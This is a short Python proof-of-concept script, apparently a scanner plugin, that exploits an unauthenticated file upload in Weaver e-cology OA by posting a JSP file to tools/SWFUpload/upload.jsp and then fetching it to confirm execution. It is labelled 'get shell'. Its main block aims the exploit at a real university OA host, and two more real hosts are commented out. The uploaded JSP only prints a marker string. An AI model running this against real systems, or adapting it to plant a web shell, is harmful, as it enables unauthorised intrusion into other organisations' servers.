#!usr/bin/env python
# *-* coding:utf-8 *-*

#name: weaver_e-cology get shell
#author: yichin
#refer: http://beebeeto.com/pdb/poc-2015-0117/
#refer: http://www.wooyun.org/bugs/wooyun-2014-076547


def assign(service, arg):
    if service == "weaver_oa":
        return True, arg

def audit(arg):
    #check if file nultest_s_c_a_n.jsp exists 
    verifyUrl = arg + 'nulltest_s_c_a_n.jsp'
    uploadUrl = arg + 'tools/SWFUpload/upload.jsp'
    #upload
    postData = """------WebKitFormBoundaryKz3wgEXqUoRQuWhq\r
Content-Disposition: form-data; name=\\"test\\"; filename=\\"test_s_c_a_n.jsp\\"\r
Content-Type: application/octet-stream\r
\r
<%@ page import=\\"java.util.*,java.io.*\\" %>\r
<%@ page import=\\"java.io.*\\"%>\r
<% out.println(\\"testvul...\\");%>\r
------WebKitFormBoundaryKz3wgEXqUoRQuWhq--\r
"""
    contentType = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKz3wgEXqUoRQuWhq";
    curlArg = '-H "' + contentType +'" -d "' +postData+ '" ' +uploadUrl
    code, head, res, errcode, _ = curl.curl(curlArg)

    #verify
    code, head, res, errcode, _ = curl.curl(verifyUrl)
    if code == 200 and "testvul..." in res:
        security_hole('weaver e-cology get shell ' + arg + 'tools/SWFUpload/upload.jsp')
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://oa.yangtzeu.edu.cn/')[1])
    #audit(assign('weaver_e-cology', 'http://oa.cncie.com/')[1])
    #audit(assign('weaver_e-cology', 'http://oaf.yitoa.com:6688/')[1])